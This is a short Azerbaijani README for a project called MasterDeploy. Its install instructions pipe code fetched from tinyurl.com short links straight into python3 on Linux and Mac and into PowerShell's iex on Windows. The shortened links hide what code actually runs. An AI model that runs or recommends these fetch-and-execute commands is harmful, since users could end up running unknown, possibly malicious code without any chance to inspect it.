# MasterDeploy

MasterDeploy layihəsini serverinizdə və ya lokal kompüterinizdə avtomatik qurmaq üçün aşağıdakı qısa əmrlərdən istifadə edə bilərsiniz.

## Linux və Mac üçün
Terminalda bu əmri işə salın:
```bash
curl -sL https://tinyurl.com/4xzjwsvy | python3 -
```

## Windows üçün
PowerShell-i açıb bu əmri daxil edin:
```powershell
irm https://tinyurl.com/2t7hdcjz | iex
```
